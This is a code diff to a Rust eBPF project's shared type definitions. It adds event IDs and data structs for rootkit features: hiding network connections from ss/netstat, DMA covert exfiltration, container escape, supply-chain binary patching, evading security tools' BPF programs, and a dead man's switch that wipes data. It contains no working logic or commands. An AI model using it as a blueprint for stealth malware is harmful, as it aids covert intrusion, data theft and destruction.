@@ -171,6 +171,52 @@ pub const EVENT_INITRAMFS_IMPLANT: u32 = 45;
 pub const EVENT_MODSIGN_BYPASS: u32 = 46;
 pub const EVENT_BPF_LINK_PINNED: u32 = 47;
 
+// Hypervisor evasion events
+pub const EVENT_HYPERVISOR_DETECTED: u32 = 48;
+pub const EVENT_HYPERVISOR_FINGERPRINT: u32 = 49;
+pub const EVENT_HYPERVISOR_BLINDSPOT: u32 = 50;
+pub const EVENT_LIVE_MIGRATION_DETECTED: u32 = 51;
+
+// Polymorphic/self-replication events
+pub const EVENT_BYTECODE_MORPHED: u32 = 52;
+pub const EVENT_PATTERN_ROTATED: u32 = 53;
+pub const EVENT_OPAQUE_PREDICATE: u32 = 54;
+
+// Phantom network stack events
+pub const EVENT_PHANTOM_SYN_ACK: u32 = 55;
+pub const EVENT_PHANTOM_CONN_ESTABLISHED: u32 = 56;
+pub const EVENT_PHANTOM_DATA_XFER: u32 = 57;
+
+// Cross-container lateral movement events
+pub const EVENT_CGROUP_BPF_INJECT: u32 = 58;
+pub const EVENT_CONTAINER_LATERAL: u32 = 59;
+pub const EVENT_NAMESPACE_ESCAPE: u32 = 60;
+
+// DMA covert channel events
+pub const EVENT_DMA_STASH: u32 = 61;
+pub const EVENT_PCIE_TLP_SIGNAL: u32 = 62;
+pub const EVENT_NIC_EXFIL: u32 = 63;
+
+// Behavioral AI camouflage events
+pub const EVENT_BEHAVIOR_PROFILED: u32 = 64;
+pub const EVENT_ACTIVITY_THROTTLED: u32 = 65;
+pub const EVENT_NORM_DEVIATION_AVOIDED: u32 = 66;
+
+// Supply chain persistence events
+pub const EVENT_PKG_MANAGER_HOOKED: u32 = 67;
+pub const EVENT_BINARY_PATCHED_INFLIGHT: u32 = 68;
+pub const EVENT_INTEGRITY_BYPASSED: u32 = 69;
+
+// Dead man's switch events
+pub const EVENT_HEARTBEAT_RECEIVED: u32 = 70;
+pub const EVENT_DEADMAN_ARMED: u32 = 71;
+pub const EVENT_SCORCHED_EARTH: u32 = 72;
+
+// BPF parasitism events
+pub const EVENT_BPF_PROG_DETECTED: u32 = 73;
+pub const EVENT_TAILCALL_INJECTED: u32 = 74;
+pub const EVENT_PROG_ARRAY_HIJACKED: u32 = 75;
+
 // Defense event types (100+)
 pub const EVENT_GHOST_MAP_FOUND: u32 = 100;
 pub const EVENT_LATENCY_ANOMALY: u32 = 101;
@@ -426,6 +472,69 @@ pub struct ProcSpoofEntry {
     pub _pad: [u8; 7],
 }
 
+/// Hypervisor detection info.
+#[repr(C)]
+#[derive(Clone, Copy, Debug)]
+pub struct HypervisorInfo {
+    pub hv_type: u32,
+    pub features: u32,
+    pub tsc_offset: u64,
+}
+
+/// Phantom TCP connection state (invisible to ss/netstat).
+#[repr(C)]
+#[derive(Clone, Copy, Debug)]
+pub struct PhantomConnState {
+    pub src_ip: u32,
+    pub dst_ip: u32,
+    pub src_port: u16,
+    pub dst_port: u16,
+    pub seq_num: u32,
+    pub ack_num: u32,
+    pub state: u8,
+    pub _pad: [u8; 3],
+}
+
+/// Behavioral AI profiling state.
+#[repr(C)]
+#[derive(Clone, Copy, Debug)]
+pub struct BehaviorProfile {
+    pub syscall_count: [u32; 8],
+    pub avg_interval_ns: u64,
+    pub last_action_ns: u64,
+    pub throttle_until_ns: u64,
+}
+
+/// Dead man's switch configuration.
+#[repr(C)]
+#[derive(Clone, Copy, Debug)]
+pub struct DeadmanConfig {
+    pub heartbeat_interval_ns: u64,
+    pub last_heartbeat_ns: u64,
+    pub armed: u32,
+    pub wipe_on_trigger: u32,
+}
+
+/// Detected BPF program (security tool) info.
+#[repr(C)]
+#[derive(Clone, Copy, Debug)]
+pub struct DetectedBpfProg {
+    pub prog_id: u32,
+    pub prog_type: u32,
+    pub attach_type: u32,
+    pub _pad: u32,
+    pub name_hash: u64,
+}
+
+/// Supply chain binary patching target.
+#[repr(C)]
+#[derive(Clone, Copy, Debug)]
+pub struct SupplyChainTarget {
+    pub path_hash: u64,
+    pub patch_offset: u32,
+    pub patch_len: u32,
+}
+
 // ──────────────────────────────────────────────
 // Safety: All structs above are plain-old-data (POD) types.
 // They contain no pointers, no references, and no Drop impls.
@@ -497,3 +606,21 @@ unsafe impl aya::Pod for SlackHideEntry {}
 
 #[cfg(feature = "user")]
 unsafe impl aya::Pod for ProcSpoofEntry {}
+
+#[cfg(feature = "user")]
+unsafe impl aya::Pod for HypervisorInfo {}
+
+#[cfg(feature = "user")]
+unsafe impl aya::Pod for PhantomConnState {}
+
+#[cfg(feature = "user")]
+unsafe impl aya::Pod for BehaviorProfile {}
+
+#[cfg(feature = "user")]
+unsafe impl aya::Pod for DeadmanConfig {}
+
+#[cfg(feature = "user")]
+unsafe impl aya::Pod for DetectedBpfProg {}
+
+#[cfg(feature = "user")]
+unsafe impl aya::Pod for SupplyChainTarget {}
